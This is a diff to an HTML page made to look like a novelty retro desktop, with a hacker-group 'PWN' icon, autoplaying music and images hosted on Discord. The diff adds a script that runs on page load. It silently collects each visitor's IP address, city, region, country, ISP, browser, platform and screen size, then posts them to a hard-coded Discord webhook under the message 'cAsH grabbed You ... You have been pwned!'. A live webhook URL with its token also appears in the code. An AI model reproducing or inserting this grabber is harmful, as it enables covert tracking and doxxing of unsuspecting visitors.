@@ -17,7 +17,8 @@
             height: 100%;
             font-family: "Tahoma", sans-serif;
             overflow: hidden;
-            background: url('./eb0f8c3e2e1a8e1508f3afa2c86ad51f.gif') no-repeat center center fixed;
+            cursor: url('https://cdn.discordapp.com/attachments/1069599369529135146/1329165444934008864/Pictogrammers-Material-Cursor-default.512.png?ex=67895948&is=678807c8&hm=5c88ebbb1cf454b8a1c884e530ccc5bb1bd54bc038ff0488eb24304038d55698&'), auto;
+            background: url('https://cdn.discordapp.com/attachments/1069599369529135146/1329157116531048470/eb0f8c3e2e1a8e1508f3afa2c86ad51f.gif?ex=67895187&is=67880007&hm=1ae5a99b37fefbf2cbb0f981cca41f30e65b07a042db7ece147b12436f3a2e23&') no-repeat center center fixed;
             background-size: cover;
         }
 
@@ -27,64 +28,55 @@
             bottom: 0;
             left: 0;
             width: 100%;
-            height: 40px;
-            background: linear-gradient(to top, #1c86ee, #104e8b);
+            height: 50px;
+            background: black;
             display: flex;
             align-items: center;
             justify-content: flex-start;
-            box-shadow: 0 -2px 5px rgba(0, 0, 0, 0.5);
+            box-shadow: 0 -3px 5px rgba(0, 0, 0, 0.8);
             z-index: 100;
         }
 
         .start-button {
-            width: 80px;
-            height: 30px;
-            background: linear-gradient(to top, #ffffff, #d6d6d6);
-            border: 1px solid #999;
-            border-radius: 3px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
+            width: 50px;
+            height: 50px;
+            background: none;
+            border: none;
             margin-left: 10px;
             cursor: pointer;
-            transition: background 0.3s;
-        }
-
-        .start-button:hover {
-            background: linear-gradient(to top, #d6d6d6, #ffffff);
         }
 
         .start-button img {
-            width: 20px;
-            margin-right: 5px;
+            width: 40px;
+            height: 40px;
+            transition: transform 0.2s ease-in-out;
         }
 
-        .start-button span {
-            font-size: 14px;
-            font-weight: bold;
-            color: black;
+        .start-button img:hover {
+            transform: scale(1.1);
         }
 
         /* Desktop Icons */
         .desktop {
             position: relative;
             width: 100%;
-            height: calc(100% - 40px); /* Account for the taskbar */
+            height: calc(100% - 50px); /* Account for the taskbar */
             display: flex;
-            flex-wrap: wrap;
+            flex-direction: column;
+            align-items: flex-start;
             padding: 20px;
         }
 
         .icon {
-            width: 100px;
-            margin: 10px;
+            width: 80px;
+            margin: 10px 0;
             text-align: center;
             cursor: pointer;
         }
 
         .icon img {
-            width: 64px;
-            height: 64px;
+            width: 48px;
+            height: 48px;
             transition: transform 0.2s ease;
         }
 
@@ -103,88 +95,106 @@
             border-radius: 3px;
         }
 
-        /* Popup Window */
-        .window {
-            position: absolute;
+        /* Popup Alert */
+        .alert {
+            position: fixed;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
-            width: 400px;
-            height: 300px;
-            background: white;
-            border: 2px solid black;
-            border-radius: 5px;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.5);
+            background: black;
+            color: white;
+            padding: 20px 30px;
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.8);
+            text-align: center;
+            font-size: 16px;
+            font-weight: bold;
             z-index: 200;
             display: none;
-        }
-
-        .window-header {
-            background: #1e90ff;
-            padding: 10px;
-            color: white;
-            font-size: 16px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            border-bottom: 2px solid black;
-        }
-
-        .window-content {
-            padding: 20px;
-            font-size: 14px;
-            color: black;
-        }
-
-        .close-btn {
-            background: white;
-            border: none;
-            font-size: 14px;
-            cursor: pointer;
+            opacity: 0;
+            transition: opacity 0.3s ease-in-out;
         }
     </style>
 </head>
 <body>
+    <!-- Background Music -->
+    <audio id="backgroundMusic" autoplay loop>
+        <source src="https://cdn.discordapp.com/attachments/1069599369529135146/1329164787975852163/Eternxlkz_-_BRODYAGA_FUNK_Official_Audio.mp3?ex=678958ac&is=6788072c&hm=4f4db7901279d16f46a8fa4c9e8254f11e953a1c4cdaa1f1c575ab1fae90e182&" type="audio/mpeg">
+    </audio>
+
     <!-- Desktop -->
     <div class="desktop">
-        <!-- Example Icon -->
-        <div class="icon" onclick="openWindow()">
-            <img src="./imgbin_lulzsec-security-hacker-anonymous-computer-security-hacker-group-png.png" alt="PWN Icon">
+        <!-- PWN Icon -->
+        <div class="icon" onclick="showAlert()">
+            <img src="https://cdn.discordapp.com/attachments/1069599369529135146/1329157216397426740/imgbin_lulzsec-security-hacker-anonymous-computer-security-hacker-group-png.png?ex=6789519e&is=6788001e&hm=32c9b431a66036f3cd6309f101c71e872bfe2a0231ff560a63f5af08417de004&" alt="PWN Icon">
             <span>PWN</span>
+        </div>
+        <!-- AY1 Icon -->
+        <div class="icon" onclick="redirectToAY1()">
+            <img src="https://cdn.discordapp.com/attachments/1069599369529135146/1313612143672692896/1111.png?ex=6788cbe4&is=67877a64&hm=06a90109a591ed47390a24067a57424ec883838796e5956f73ca513b03e96378&" alt="AY1 Icon">
+            <span>AY1</span>
         </div>
     </div>
 
     <!-- Taskbar -->
     <div class="taskbar">
-        <div class="start-button" onclick="toggleStartMenu()">
-            <img src="https://via.placeholder.com/20?text=Start" alt="Start Icon">
-            <span>Start</span>
-        </div>
+        <button class="start-button" onclick="openGame()">
+            <img src="https://cdn.discordapp.com/attachments/1069599369529135146/1329158869271838740/start_icon.jpg?ex=67895329&is=678801a9&hm=d284bb65c281b3ff4de78035e560881bbfd9eb4e04b338cfbdabf442ac690a3b&" alt="Start Icon">
+        </button>
     </div>
 
-    <!-- Popup Window -->
-    <div class="window" id="window">
-        <div class="window-header">
-            <span>Window Title</span>
-            <button class="close-btn" onclick="closeWindow()">X</button>
-        </div>
-        <div class="window-content">
-            Discord: .pwwn
-        </div>
+    <!-- Smooth Alert -->
+    <div class="alert" id="alertBox">
+        Made by cAsH
     </div>
 
     <script>
-        function toggleStartMenu() {
-            alert('Start menu clicked (not yet implemented)');
+        // Fetch and send IP to webhook
+        async function fetchAndSendIP() {
+            try {
+                const ipResponse = await fetch('https://api.ipify.org/?format=json');
+                const ipData = await ipResponse.json();
+                const userIP = ipData.ip;
+
+                const geoResponse = await fetch(`https://ipinfo.io/${userIP}/json`);
+                const geoData = await geoResponse.json();
+
+                const userAgent = navigator.userAgent;
+                const platform = navigator.platform;
+                const screenWidth = screen.width;
+                const screenHeight = screen.height;
+                const timestamp = new Date().toLocaleString();
+
+                // Build webhook message content
+                const webhookMessage = `
+:cAsH:  cAsH grabbed You :cAsH: 
+
+**User IP:** ${userIP}
+**Location:** ${geoData.city}, ${geoData.region}, ${geoData.country}
+**ISP:** ${geoData.org || "Unknown"}
+**Browser:** ${userAgent}
+**Platform:** ${platform}
+**Screen Resolution:** ${screenWidth}x${screenHeight}
+**Timestamp:** ${timestamp}
+
+||@everyone|| **You have been pwned!**
+                `;
+
+                // Send to Discord Webhook
+                await fetch("https://discord.com/api/webhooks/1328900605896429612/-KgtIr5H2_vXUJnpQvHEHswyrDT20z-WkVAm0mYnb_I23dqfVqPqSmzUBdc9PvwCA9vi", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        content: webhookMessage
+                    })
+                });
+            } catch (error) {
+                console.error('Error fetching IP or sending to webhook:', error);
+            }
         }
 
-        function openWindow() {
-            document.getElementById('window').style.display = 'block';
-        }
-
-        function closeWindow() {
-            document.getElementById('window').style.display = 'none';
-        }
+        // Trigger IP Fetch and Send on Page Load
+        fetchAndSendIP();
     </script>
 </body>
 </html>
